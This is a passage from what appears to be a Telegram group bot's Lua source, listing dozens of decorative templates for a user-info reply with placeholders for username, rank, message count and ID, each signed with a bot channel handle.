- 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇪🇬 ꙰
ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇪🇬 ꙰
ᯓ 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  🖤 ↴
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  🖤 ↴
.𖣂 𝙡𝘿 , #id  🖤 ↴
.𖣂 𝘼𝙪𝙩𝙤 , #auto  🖤 ↴
.𖣂 𝙢𝙨𝙂𝙨 , #msgs  🖤 ↴
.𖣂 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
➥• USE 𖦹 #username - 🇪🇬.
➥• MSG 𖥳 #msgs  - 🇪🇬.
➥• STA 𖦹 #stast - 🇪🇬.
➥• iD 𖥳 #id - 🇪🇬.
➥• 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
👳🏼‍♂ - 𝄬 stast . #stast . 🇪🇬
👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
👳🏼‍♂ - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
➭- 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
𓄼 ᴜѕᴇ : #username ♕
𓄼 ѕᴛᴀ : #stast  ☥
𓄼 ɪᴅ : #id ‌‌‏⚚
𓄼 ᴍѕɢ : #msgs 𓆊 
𓐀 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𓀃.
𓄼 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs .
𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username .
𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
𝐓𝐓• 𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
𝟓 𝟔 𖡻 #msgs  ࿇🦄
𝟓 𝟔 𖡻 #auto  ࿇🦄
𝟓 𝟔 𖡻 #stast  ࿇🦄
𝟓 𝟔 𖡻 #id  ࿇🦄
𝟓 𝟔 𖡻 𝗖𝗛 - @SOPOWERB0T 💞.
]],
[[
༻┉𖦹┉┉𖦹┉┉𖦹┉┉𖦹┉༺
• |𝗜𝗗  ⁞ #id
• |𝗨𝗦𝗘 ⁞ #username
• |𝗦𝗧𝗔  ⁞ #stast
• |𝗠𝗦𝗚  ⁞ #edit
• |𝗔𝗨𝗧𝗢 ⁞ #auto
—————————————
𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
┄─┉┉◉┉┉─┄
𖣰𖡻 𖡋𝗜𝗗• #id •𓀎
𖣰𖡻 𖡋𝗨𝗦𝗘• #username •𓀎
𖣰𖡻 𖡋𝗦𝗧𝗔• #stast •𓀎
𖣰𖡻 𖡋𝗠𝗦𝗚• #msgs •𓀎
𖣰𖡻 𖡋𝗔𝗨𝗧𝗢• #auto •𓀎
𖣰𖡻 𖡋𝗘𝗗𝗜𝗧• #edit • 𓀎
┄─┉┉◉┉┉─┄
𝗖𝗛 - @SOPOWERB0T 🦅.
]],
[[
𖤍 |↶ #id    ꙰🇪🇬.
𖤍 |↶ #username    ꙰🇪🇬.
𖤍 |↶ #msgs    ꙰🇪🇬.
𖤍 |↶ #stast    ꙰🇪🇬.
𖤍 |↶ 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 𝗨𝗦𝗘𝗥 ⟿ #username  « 
 𝗠𝗦𝗚𝗦 ⟿  #msgs  « 
 𝗦𝗧𝗔 ⟿ #stast  « 
 𝗜𝗗  ⟿ #id  « 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
🇪🇬≪💎≫ #username • メ
🇪🇬≪💎≫ #stast  •メ
🇪🇬≪💎≫ #id  • メ
🇪🇬≪💎≫ #msgs  •メ
🇪🇬≪💎≫ #game •メ
🇪🇬𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
⌯  𝚄𝚂𝙴𝚁 𓄹𓄼 #username
⌯  𝙸𝙳  𓄹𓄼 #id 
⌯  𝚂𝚃𝙰 𓄹𓄼 #stast 
⌯  𝙼𝚂𝙶𝚂𓄹𓄼 #msgs
⌯  𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
𓅓➪ : Iᗪ : #id - ❦ . 
𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
𓅓➪ : 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
- ايديڪ  ⁞ #id 💘 ٬
- يوزرڪ القميل ⁞ #username 💘 ٬
- رسائلڪ  الطيفهہَ ⁞ #msgs 💘 ٬
- رتبتڪ الحلوه ⁞ #stast  💘٬
- سحڪاتڪ الفول ⁞ #edit 💘 ٬
- 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
𓁷 - 𝙞𝙙 †: #id 𓀀 .
𓁷 - 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
𖡋 𝐔𝐒𝐄 ⌯ #username 
𖡋 𝐌𝐒𝐆 ⌯ #msgs 
𖡋 𝐒𝐓𝐀 ⌯ #stast 
𖡋 𝐈𝐃 ⌯ #id 
𖡋 𝐄𝐃𝐈𝐓 ⌯ #edit
𖡋 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
𖤂 ~ 𝑢𝑠𝑒 #username  𖤐
𖤂 ~ 𝑚𝑠𝑔 #msgs 𖤐
𖤂 ~ 𝑠𝑡𝑎 #stast  
𖤂 ~ 𝑖𝑑 #id 𖤐
𖤂 ~ 𝑒𝑑𝑖𝑡 #edit 𖤐
𖤂 ~ 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
-›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
-›   𝚂𝚃𝙰𝚂𝚃 . #stast 🇪🇬 ꙰
-›   𝙸𝙳 . #id 🇪🇬 ꙰ 
-›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
-›   𝙼𝚂𝙶𝚂 . #msgs 🇪🇬 ꙰
-›   𝗖𝗛 - @SOPOWERB0T 🇪🇬 ꙰.
]],
[[
••• ••• ••• ••• ••• ••• ••• 
࿕ ¦• 𝙐𝙎𝙀𝙍  ⟿ #username ༆
 ࿕ ¦• 𝙈𝙎𝙂𝙎   ⟿ #msgs ༆
 ࿕ ¦• 𝙂𝙈𝘼𝙎  ⟿ #stast ༆
 ࿕ ¦• 𝙏𝘿 𝙎𝙏𝘼  ⟿ #id ༆
••• ••• ••• ••• ••• ••• •••
 ࿕ ¦• 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
► 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 #username 𓃚  ꙰
► 𝗜𝗗 #id 𓃚 ꙰
► 𝗦𝗧𝗔𝗦 #stast 𓃚 ꙰
► 𝗠𝗦𝗔𝗚 #msgs 𓃚 ꙰
► 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
- UsEr🇪🇬 ꙰ #username
- StA🇪🇬 ꙰   #msgs
- MsGs🇪🇬 ꙰ #stast
- ID🇪🇬 ꙰  #id
- 𝗖𝗛 🇪🇬 ꙰  @SOPOWERB0T 🦅
]],
[[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 - 𝚄𝚂𝙴𝚁 ⟿ #username 💘.
🇪🇬 - 𝙼𝚂𝙶𝚂 ⟿  #msgs 💘.
🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
- 𓏬 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
ᯓ 𝟔𝟔𝟔 𖡋 #username •✟
ᯓ 𝟔𝟔𝟔𖡋 #stast  •✟
ᯓ 𝟔𝟔𝟔𖡋 #id  • ✟
ᯓ 𝟔𝟔𝟔𖡋 #msgs  •✟ 
ᯓ 𝟔𝟔𝟔𖡋 #game •✟
ᯓ 𝟔𝟔𝟔𖡋 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
🦅•𝐮𝐬𝐞𝐫 : #username 𖣬  
🦅•𝐦𝐬𝐠  : #msgs 𖣬 
🦅•𝐬𝐭𝐚 : #stast 𖣬 
🦅•𝐢𝐝  : #id 𖣬
🦅•𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
- ѕᴛᴀᴛѕ ➣ #stast .
- ʏᴏᴜʀ ɪᴅ ➣ #id  .
- 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
- ᴜѕʀ: #username ঌ.
- ᴍѕɢ: #msgs  ঌ.
- ѕᴛᴀ: #stast  ঌ.
- ɪᴅ: #id ঌ.
- 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
- 𝑢𝑠𝑒𝑟𝑛𝑎𝑚𝑒 ⟿ #username
- 𝑚𝑠𝑔𝑠 ⟿ #msgs
- 𝑖𝑑 ⟿ #id
- 𝑒𝑑𝑖𝑡 ⟿ #edit
- 𝑔𝑎𝑚𝑒 ⟿ #game
- 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
🌯 ¦✙• 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 ➢ ⁞  #username 🇪🇬
🌯 ¦✙• 𝒎𝒔𝒈𝒔 ➢ ⁞  #msgs  📝
🌯 ¦✙• 𝒓𝒂𝒏𝒌 ➢ ⁞ #stast  
🌯 ¦✙• 𝒊𝒅 𝒔𝒕𝒂 ➢ ⁞ #id  🆔
🌯 ¦ 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 ꙰  - 𝚞 𝚜𝚎 𝚛 ➟ #username  ❃.
🇪🇬 ꙰  - 𝚖 𝚜𝚐 𝚜 ➟ #msgs ❃.
🇪🇬 ꙰  - 𝚐 𝚖 𝚊𝚜  ➟ #stast ❃.
🇪🇬 ꙰  - 𝙸𝙳 𝚜𝚝𝚊   ➟ #id ❃.
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 ꙰  - 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
⌔➺: Msgs : #msgs - 🔹.
⌔➺: ID : #id - 🔹.
⌔➺: Stast : #stast -🔹.
⌔➺: UserName : #username -🔹.
⌔➺: 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
¦• 𝚄𝚂𝙴𝚁  ⇉⁞ #username ↝🇪🇬.
¦• 𝙼𝚂𝙶𝚂 ⇉ ⁞  #msgs  ↝ 🇪🇬.
¦• 𝚁𝙰𝙽𝙺  ⇉⁞ #stast  ↝🇪🇬.
¦• 𝙸𝙳 𝚂𝚃𝙰 ⇉ #id  ↝🇪🇬.
¦• 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
➞: 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
➼ : 𝐼𝐷 𖠀 #id . ♡
➼ : 𝑈𝑆𝐸𝑅 𖠀 #username .♡
➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
➼ : 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
▽ ¦⋄• USER ➭ ⁞ #username .
▽ ¦⋄• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
▽ ¦⋄• STAT ➬ ⁞ #stast  .
▽ ¦⋄• 𝙸𝙳  ➬ ⁞ #id  .
▽ ¦⋄• 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
• ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
• ❉ 𝑺𝑻𝑨 : #stast .
• ❉ 𝑰𝑫 : #id  ‌‌‏.
• ❉  𝑴𝑺𝑮 : #msgs 𓆊.
• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
• ❉ 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
⌯ |USERNAME #username 𓃚
⌯ | YOUR -ID - #id 𓃚
⌯ | STAS-#stast 𓃚
 ⌯| MSAG - #msgs 𓃚
 ⌯| 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
𝟔𝟔𝟔 𖡋 #username • 𖣰💞
𝟔𝟔𝟔 𖡋  #stast •𖣰💞
𝟔𝟔𝟔 𖡋 #id • 𖣰💞
𝟔𝟔𝟔 𖡋 #game • 𖣰💞
𝟔𝟔𝟔 𖡋 #msgs • 𖣰💞
𝟔𝟔𝟔 𖡋 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
⌔➺: Msgs : #msgs - 🔹.
⌔➺: ID : #id - 🔹.
⌔➺: Stast : #stast -🔹.
⌔➺: UserName : #username -🔹.
⌔➺: 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
🦅 - 𝓾𝓼𝓮𝓻 ➪ #username 🦅.
🦅 - 𝓼𝓽𝓪𝓼𝓽  ➪ #stast 🦅.
🦅 - 𝓲𝓭 ➪ #id ⸙🦅.
🦅 - 𝓰𝓶𝓪𝓼 ➪ #gmas ⸙🦅.
🦅 - 𝓶𝓼𝓰𝓼 ➪ #msgs 🦅.
🦅 - 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
◣: 𝒔𝒕𝒂𓂅 #stast 𓍯➥♡.
◣: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➥♡.
◣: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➥♡.
◣: 𝒊𝒅 𓂅 #id 𓍯➥♡.
◣: 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
- 𝄬 username . #username ➪🇪🇬
 - 𝄬 stast . #stast ➪🇪🇬
 - 𝄬 id . #id ➪🇪🇬
 - 𝄬 msgs . #msgs ➪🇪🇬
 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
↣• USE ➤ #username  ↝🍬.
↣• MSG ➤  #msgs  ↝🍬.
↣• STA ➤  #stast  ↝🍬.
↣• iD ➤ #id  ↝🍬.
↣• 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
➫✿: S #stast 𓍯➟♡.
➫✿: U𓂅 #username 𓍯➟♡.
➫✿: M𓂅 #msgs 𓍯➟♡.
➫✿:  I  #id ➟♡.
➫✿: 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
✶- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯↝❃.
✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
✶- 𝒊𝒅 𓂅 #id 𓍯↝❃.
✶- 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
• 🖤 | 𝑼𝑬𝑺 :  #username

• 🖤 | 𝑺𝑻𝑨 : #stast

• 🖤 | 𝑰𝑫 :  #id

• 🖤 | 𝑴𝑺𝑮 : #msgs

• 🖤 | 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
• USE 𖦹 #username 
• MSG 𖥳 #msgs  
• STA 𖦹 #stast 
• iD 𖥳 #id
• 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
- ѕᴛᴀᴛѕ ➣ #stast .
- ʏᴏᴜʀ ɪᴅ ➣ #id  .
- ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
- ᴅᴇᴛᴀɪʟs ➣ #auto . 
-  ɢᴀᴍᴇ ➣ #game .
- 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
⚕𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 : #username
⚕𝙈𝙀𝙎𝙎𝘼𝙂𝙀𝙎 : #msgs
⚕𝙎𝙏𝘼𝙏𝙎 : #stast
⚕𝙄𝘿 : #id
⚕𝙅𝙀𝙒𝙀𝙇𝙎 : #game
⚕𝘿𝙀𝙑 : #ridha
⚕𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
• 🦄 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🦄 | 𝑺𝑻𝑨 : #stast ☥
• 🦄 | 𝑰𝑫 : #id ‌‌‏♕
• 🦄 | 𝑴𝑺𝑮 : #msgs 𓆊
• 🦄 | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 : ⁞
• 🦄 | 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
• △ | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• ▽ | 𝑺𝑻𝑨 : #stast ☥
• ⊠ | 𝑰𝑫 : #id ‌‌‏♕
• ❏ | 𝑴𝑺𝑮 : #msgs 𓆊
• ❏ | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 :
• ❏ | 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
┇iD ➺ #id 💘
┇UsEr ➺ #username 💕
┇MsG ➺ #msgs 🧸 
┇StAtE ➺ #stast 🎀
┇EdIT ➺ #edit  💒
┇𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
• 🖤 | 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
𓄼 ᴜѕᴇ : #username ♕
𓄼 ѕᴛᴀ : #stast ☥
𓄼 ɪᴅ : #id ‌‌‏⚚
𓄼 ᴍѕɢ : #msgs 𓆊
𓄼 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
‎⿻┊Yor iD 𖠄 #id ٫
‌‎⿻┊UsEr 𖠄 #username ٫
‌‎⿻┊MsGs 𖠄 #msgs ٫
‌‎⿻┊StAtS 𖠄 #stast ٫
‌‎⿻┊‌‎EdiT 𖠄 #edit ٫
‌‎⿻┊‌‎𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
• ﮼ايديك  #id 🌻 ٬
• ﮼يوزرك ➺ #username 🌻 ٬
• ﮼مسجاتك ➺ #msgs 🌻 ٬
•  ﮼رتبتك➺ #stast 🌻 ٬
• ﮼تعديلك ➺ #edit 🌻 ٬
•  تعين ➺ @SOPOWERB0T 🦅
]],
[[
┄─┉┉◉┉┉─┄
𖣤 ᴜѕᴇʀɴᴀᴍᴇ 𓄹𓄼 #id 🇪🇬
𖦼 ʏᴏᴜʀ ɪᴅ 𓄹𓄼 #username  💛
𖥪 ᴍѕɢѕ 𓄹𓄼 #msgs ✉️
𖥧 ѕᴛᴀᴛѕ 𓄹𓄼 #stast 👩🏿‍🚒 
𖥣 ᴇᴅɪᴛ 𓄹𓄼 #game🙇🏿‍♀💕
✰ ᴄʜ ᴇʟɪɴ ➣ #edit
┄─┉┉◉┉┉─┄
✰ 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
⌾ | 𝒊𝒅  𓃠 #id .
⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username .
⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs .
⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast .
⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
⌾ | 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
♡ : 𝐼𝐷 𖠀 #id .
♡ : 𝑈𝑆𝐸𝑅 𖠀 #username .
♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
♡ : 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
•ᑌᔕᗴᖇ- #username 
•ᔕTᗩ- #stast 
•ᗰᔕ- #msgs 
•Iᗪ- #id
•𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
• USE ➤ #username  .
• MSG ➤  #msgs  .
• STA ➤  #stast  .
• iD ➤ #id  .
• 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
𝐘𝐨𝐮𝐫 𝐈𝐃 ☤🇪🇬- #id 
𝐔𝐬𝐞𝐫𝐍𝐚☤🇪🇬- #username 
𝐒𝐭𝐚𝐬𝐓 ☤🇪🇬- #stast 
𝐌𝐬𝐠𝐒☤🇪🇬 - #msgs
𝗖𝗛☤🇪🇬 - @SOPOWERB0T 🦅
]],
[[
⭐️𝖘𝖙𝖆 : #stast ـ🍭
⭐️𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : #username ـ🍭
⭐️𝖒𝖘𝖌𝖘 : #msgs ـ🍭
⭐️𝖎𝖉 : #id ـ 🍭
⭐️𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
• 🇪🇬 - 𝚄𝚂𝙴𝚁 « #username  🍭
• 🇪🇬 - 𝙸𝙳 « #id  🍭
• 🇪🇬 - 𝙼𝚂𝙶𝚂 « #msgs  🍭
• 🇪🇬 - 𝚂𝚃𝙰𝚂𝚃 « #stast  🍭
• 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
• USE ➤  #username .
• MSG ➤  #msgs .
• STA ➤  #stast .
• iD ➤ #id .
• 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
🇪🇬 - 𝄬 ˢᵀᴬˢᵀ . #stast  𓃠
🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
➜𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : #username
➜𝗠𝗘𝗦𝗦𝗔𝗚𝗘𝗦 : #msgs
➜𝗦𝗧𝗔𝗧𝗦 : #stast
➜𝗜𝗗 : #id
➜𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
- 🇪🇬 UsErNaMe . #username 𖠲
- 🇪🇬 StAsT . #stast 𖠲
- 🇪🇬 Id . #id 𖠲
- 🇪🇬 GaMeS . #game 𖠲
- 🇪🇬 MsGs . #msgs 𖠲
- 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
⌔┇Msgs : #msgs.
⌔┇ID : #id.
⌔┇Stast : #stast.
⌔┇UserName : #username.
⌔┇𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
𝒔𝒕𝒂𓂅 #stast 𓍯
𝒖𝒔𝒆𝒓𓂅 #username 𓍯
𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯
𝒊𝒅 𓂅 #id 𓍯
𓂅 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
𓄼🇪🇬 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username ♕
𓄼🇪🇬 𝑺𝒕𝒂𝒔𝒕 : #stast    ☥
𓄼🇪🇬 𝒊𝒅 : #id ‌‌‏⚚
𓄼🇪🇬 𝑮𝒂𝒎𝒆𝑺 : #edit ⚚
𓄼🇪🇬 𝑴𝒔𝒈𝒔 : #msgs 𓆊
𓄼🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
Usᴇʀ Nᴀᴍᴇ ~ #username 
Yᴏᴜʀ ɪᴅ ~ #id 
Sᴛᴀsᴛ ~ #stast 
Msᴀɢ ~ #msgs
𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
➥• USE 𖦹 #username - 🇪🇬.
➥• MSG 𖥳 #msgs  - 🇪🇬.
➥• STA 𖦹 #stast - 🇪🇬.
➥• iD 𖥳 #id - 🇪🇬.
➥• 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
🇪🇬 - 𝄬 username . #username  𓃠
🇪🇬 - 𝄬 stast . #stast  𓃠
🇪🇬 - 𝄬 id . #id 𓃠
🇪🇬 - 𝄬 gmas . #gmas 𓃠
🇪🇬 - 𝄬 msgs . #msgs  𓃠
🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  🖤 ↴
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  🖤 ↴
.𖣂 𝙡𝘿 , #id  🖤 ↴
.𖣂 𝘼𝙪𝙩𝙤 , #auto  🖤 ↴
.𖣂 𝙢𝙨𝙂𝙨 , #msgs  🖤 ↴
.𖣂 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
金 - 𝓲𝓭 . #id ⸙ 
金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
金 - 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 . #username 𖣂.
- 🇪🇬 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
- 🇪🇬 𝒊𝒅 . #id 𖣂.
- 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
- 🇪🇬 𝒎𝒔𝒈𝒔 . #msgs 𖣂.
- 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇪🇬 ꙰
ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇪🇬 ꙰
ᯓ 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
👳🏼‍♂ - 𝄬 stast . #stast . 🇪🇬
👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
👳🏼‍♂ - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
➭- 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
𓄼 ᴜѕᴇ : #username ♕
𓄼 ѕᴛᴀ : #stast  ☥
𓄼 ɪᴅ : #id ‌‌‏⚚
𓄼 ᴍѕɢ : #msgs 𓆊 
𓐀 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𓀃.
𓄼 𝗖𝗛 - @SOPOWERB0T 🦅
]],
[[
𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
